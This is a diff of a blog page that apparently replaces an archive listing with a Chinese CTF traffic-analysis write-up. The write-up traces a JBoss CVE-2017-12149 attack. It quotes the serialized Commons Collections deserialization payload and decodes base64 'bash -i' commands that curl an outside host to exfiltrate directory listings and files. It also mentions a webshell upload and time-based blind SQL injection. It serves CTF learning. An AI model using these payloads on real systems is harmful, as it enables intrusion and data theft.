@@ -108,20 +108,33 @@
 
 
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="cws6">
-<meta property="og:url" content="https://cws6.github.io/archives/page/4/index.html">
+  <meta name="description" content="1.追踪HTTP流，发现刚开始是对后台admin-console的爆破，但是并没有成功2.继续向下查看，发现有/invoker/readonly，想到CVE-2017-12149payload在post部分，将所有payload复制下来 1234....sr..java.util.HashSet.D.....4...xpw.....?@......sr.4org.apache.commons.co">
+<meta name="keywords" content="ctf记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="流量分析">
+<meta property="og:url" content="https://cws6.github.io/2019/06/05/流量分析/index.html">
 <meta property="og:site_name" content="cws6">
+<meta property="og:description" content="1.追踪HTTP流，发现刚开始是对后台admin-console的爆破，但是并没有成功2.继续向下查看，发现有/invoker/readonly，想到CVE-2017-12149payload在post部分，将所有payload复制下来 1234....sr..java.util.HashSet.D.....4...xpw.....?@......sr.4org.apache.commons.co">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-55da46167d239b30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-c73d7e57e66f626d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-f1ab47359741a7b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-dadde60e3fbb4172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-bd061fc7dc3494ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-697aa31a1320f3ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-8b33696d53321f0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-06-13T01:58:33.048Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="cws6">
+<meta name="twitter:title" content="流量分析">
+<meta name="twitter:description" content="1.追踪HTTP流，发现刚开始是对后台admin-console的爆破，但是并没有成功2.继续向下查看，发现有/invoker/readonly，想到CVE-2017-12149payload在post部分，将所有payload复制下来 1234....sr..java.util.HashSet.D.....4...xpw.....?@......sr.4org.apache.commons.co">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-55da46167d239b30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
 
 
 
-  <link rel="canonical" href="https://cws6.github.io/archives/page/4/">
+  <link rel="canonical" href="https://cws6.github.io/2019/06/05/流量分析/">
 
 
 
@@ -131,7 +144,7 @@
   };
 </script>
 
-  <title>Archive | cws6</title>
+  <title>流量分析 | cws6</title>
   
 
 
@@ -180,7 +193,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
 
@@ -256,7 +269,7 @@
         
         
           
-          <li class="menu-item menu-item-archives menu-item-active">
+          <li class="menu-item menu-item-archives">
 
     
     
@@ -277,22 +290,6 @@
 
   
     
-
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
 
   
 
@@ -318,396 +315,207 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2019/06/05/流量分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
-         
+          <h1 class="post-title" itemprop="name headline">流量分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-06-05 09:47:22" itemprop="dateCreated datePublished" datetime="2019-06-05T09:47:22+08:00">2019-06-05</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-06-13 09:58:33" itemprop="dateModified" datetime="2019-06-13T09:58:33+08:00">2019-06-13</time>
+              
+            
+          </span>
+
           
-        Good! 92 posts in total. Keep on posting.
-      </span>
-      
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/11/05/条件竞争漏洞/" itemprop="url">
-              
-                <span itemprop="name">条件竞争漏洞</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-05T17:08:38+08:00" content="2018-11-05">
-          11-05
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+        </div>
+      </header>
+    
 
-
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/10/30/xinclude和xslt的利用/" itemprop="url">
-              
-                <span itemprop="name">xinclude和xslt的利用</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-10-30T18:45:38+08:00" content="2018-10-30">
-          10-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/10/22/复现jboss-CVE-2017-12149/" itemprop="url">
-              
-                <span itemprop="name">复现jboss CVE-2017-12149</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-10-22T23:07:37+08:00" content="2018-10-22">
-          10-22
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+      
+        <p>1.追踪HTTP流，发现刚开始是对后台<code>admin-console</code>的爆破，但是并没有成功<br><img src="https://upload-images.jianshu.io/upload_images/5035860-55da46167d239b30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>2.继续向下查看，发现有<code>/invoker/readonly</code>，想到<code>CVE-2017-12149</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-c73d7e57e66f626d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>payload在post部分，将所有payload复制下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">....sr..java.util.HashSet.D.....4...xpw.....?@......sr.4org.apache.commons.collections.keyvalue.TiedMapEntry....9......L..keyt..Ljava/lang/Object;L..mapt..Ljava/util/Map;xpt..foosr.*org.apache.commons.collections.map.LazyMapn....y.....L..factoryt.,Lorg/apache/commons/collections/Transformer;xpsr.:org.apache.commons.collections.functors.ChainedTransformer0...(z.....[.</span><br><span class="line">iTransformerst.-[Lorg/apache/commons/collections/Transformer;xpur.-[Lorg.apache.commons.collections.Transformer;.V*..4.....xp....sr.;org.apache.commons.collections.functors.ConstantTransformerXv..A......L.	iConstantq.~..xpvr..java.lang.Runtime...........xpsr.:org.apache.commons.collections.functors.InvokerTransformer...k&#123;|.8...[..iArgst..[Ljava/lang/Object;L..iMethodNamet..Ljava/lang/String;[..iParamTypest..[Ljava/lang/Class;xpur..[Ljava.lang.Object;..X..s)l...xp....t.</span><br><span class="line">getRuntimeur..[Ljava.lang.Class;......Z....xp....t.	getMethoduq.~......vr..java.lang.String...8z;.B...xpvq.~..sq.~..uq.~......puq.~......t..invokeuq.~......vr..java.lang.Object...........xpvq.~..sq.~..ur..[Ljava.lang.String;..V...&#123;G...xp....t.Ibash -c &#123;echo,Y3VybCBodHRwOi8vNXJxZm9nLmNleWUuaW8v&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t..execuq.~......q.~. sq.~..sr..java.lang.Integer.......8...I..valuexr..java.lang.Number...........xp....sr..java.util.HashMap......`....F.</span><br><span class="line">loadFactorI.	thresholdxp?@......w.........xxx</span><br></pre></td></tr></table></figure>
+<p>其中反序列化执行的命令是<code>bash -c {echo,Y3VybCBodHRwOi8vNXJxZm9nLmNleWUuaW8v}|{base64,-d}|{bash,-i}</code>，</p>
+<ul>
+<li>将<code>Y3VybCBodHRwOi8vNXJxZm9nLmNleWUuaW8v</code>解码得到<code>curl http://5rqfog.ceye.io/</code></li>
+<li>将<code>Y3VybCBodHRwOi8vNXJxZm9nLmNleWUuaW8vYGNkIC8gJiYgbHN8YmFzZTY0fHRyIFwiXG5cIiBcIi1cImA=</code>解码得到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://5rqfog.ceye.io/`cd / &amp;&amp; ls|base64|tr \&quot;\n\&quot; \&quot;-\&quot;``，</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>读服务器的配置文件</p>
+<ul>
+<li>其他不再一一解码，都是在读取服务器配置文件</li>
+<li>将<code>Y3VybCBodHRwOi8vNXJxZm9nLmNleWUuaW8vYGNhdCBmbGFne2RlM2VyMWFsMXphdGkwbmA=</code>解码得到curl <a href="http://5rqfog.ceye.io/`cat" target="_blank" rel="noopener">http://5rqfog.ceye.io/`cat</a> flag{de3er1al1zati0n`，得到一部分flag。</li>
+</ul>
+<p>3.再往后跟，发现成功进到后台，那应该是读到密码了，前面如果把所有的都解码了的话，那应该拿到了第二部分flag，就是用户密码<code>_weakpa3sw0rd</code>，就算没有全部解完，在登陆的流量包中也能看到<br><img src="https://upload-images.jianshu.io/upload_images/5035860-f1ab47359741a7b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>4.继续往下看是上传的webshell，但是并没有后续利用<br><img src="https://upload-images.jianshu.io/upload_images/5035860-dadde60e3fbb4172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>5.再往后能明显看到对这个网站的其他端口的盲注<br><img src="https://upload-images.jianshu.io/upload_images/5035860-bd061fc7dc3494ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>用的是穷举法，那么<code>(mid(database(),1,1)</code>，在<code>mid()</code>中，第二个若是变化，则前一个已经匹配出来了，得到database为<code>fiyOcms</code>，这里有个小坑，虽然起始位置有8，但是并没有9，且最后位置为<code>~</code>，穷举法的变量最后一个。当穷举到正确数据时，会有一个延时，但是8之后并没有延时，所以不是有效数据。<br><img src="https://upload-images.jianshu.io/upload_images/5035860-697aa31a1320f3ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/5035860-8b33696d53321f0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>接下来时读取表名，同上，得到带三部分flag，<code>_t1mebl1ndness}</code><br>6.则flag为<code>flag{de3er1al1zati0n_weakpa3sw0rd_t1mebl1ndness}</code></p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/10/17/php+mysql实现二次注入/" itemprop="url">
-              
-                <span itemprop="name">php+mysql实现二次注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-10-17T18:32:31+08:00" content="2018-10-17">
-          10-17
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/10/10/JWT利用/" itemprop="url">
-              
-                <span itemprop="name">JWT利用</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-10-10T20:15:41+08:00" content="2018-10-10">
-          10-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/26/sudo提权/" itemprop="url">
-              
-                <span itemprop="name">sudo提权</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-09-26T20:26:19+08:00" content="2018-09-26">
-          09-26
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/24/防火墙的vpn技术/" itemprop="url">
-              
-                <span itemprop="name">防火墙的vpn技术</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-09-24T14:20:06+08:00" content="2018-09-24">
-          09-24
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/23/防火墙安全区域/" itemprop="url">
-              
-                <span itemprop="name">防火墙安全区域</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-09-23T14:20:06+08:00" content="2018-09-23">
-          09-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/22/防火墙nat技术/" itemprop="url">
-              
-                <span itemprop="name">防火墙nat技术</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-09-22T14:20:06+08:00" content="2018-09-22">
-          09-22
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/09/21/防火墙配置/" itemprop="url">
-              
-                <span itemprop="name">防火墙配置</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-09-21T14:20:06+08:00" content="2018-09-21">
-          09-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+       <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+</div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf记录/" rel="tag"># ctf记录</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/18/sql注入总结/" rel="next" title="sql注入总结">
+                <i class="fa fa-chevron-left"></i> sql注入总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/archives/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/10/">10</a><a class="extend next" rel="next" href="/archives/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
-  </nav>
+  </article>
 
 
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -977,6 +785,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
 
   
 
